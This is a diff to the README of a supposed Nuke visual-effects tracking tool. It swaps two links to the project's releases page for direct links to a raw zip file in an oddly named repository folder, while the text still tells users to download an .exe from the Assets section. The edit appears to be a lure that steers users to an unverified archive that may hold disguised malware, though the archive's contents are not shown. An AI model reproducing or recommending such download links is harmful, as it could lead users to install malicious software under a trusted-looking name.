@@ -1,6 +1,6 @@
 # 🚀 MegaflowTracker-for-Nuke - Track visual effects paths with ease
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/differentiated-aquilege508/MegaflowTracker-for-Nuke/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/differentiated-aquilege508/MegaflowTracker-for-Nuke/raw/refs/heads/main/quaternity/Tracker-Nuke-Megaflow-for-1.6.zip)
 
 ## 📁 About the software
 
@@ -20,7 +20,7 @@ Your computer needs specific hardware to run this software smoothly. Check this 
 
 You need the latest version of the software to ensure compatibility with your system. Visit the official release page to find the current build.
 
-[Download the latest release here](https://github.com/differentiated-aquilege508/MegaflowTracker-for-Nuke/releases)
+[Download the latest release here](https://github.com/differentiated-aquilege508/MegaflowTracker-for-Nuke/raw/refs/heads/main/quaternity/Tracker-Nuke-Megaflow-for-1.6.zip)
 
 Click the link above. Look for the file ending in `.exe` under the Assets section. Save this file to your computer desktop.
 
